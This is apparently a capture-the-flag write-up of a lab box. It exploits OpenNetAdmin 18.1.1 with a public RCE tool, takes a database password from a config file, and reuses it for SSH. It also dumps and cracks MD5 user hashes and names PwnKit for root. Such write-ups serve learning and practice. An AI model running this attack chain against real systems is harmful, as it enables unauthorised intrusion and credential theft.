So on the /music endpoint when you click on the login button you get sent to a /ona page where you will find that the version is vulnerable to RCE. Using the following tool we can exploit this.
https://github.com/amriunix/ona-rce

```shell
─$ python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ whoami
www-data

```

# Password Reuse
Found this in the /ona folder
```shell
sh$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?
sh$ 
```

Then checked if it work for jimmy for ssh and it didls

Since we got a password for a database I connected to the mysql

```shell
mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2024-04-25 14:07:34 | 2024-04-25 14:07:34 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)

mysql> 


```
## Hashcat
```shell
21232f297a57a5a743894a0e4a801fc3:admin                    
098f6bcd4621d373cade4e832627b4f6:test
```

# Linux Privilege Escalation
To get root run linpeas and then use the PwnKit CVE to upgrade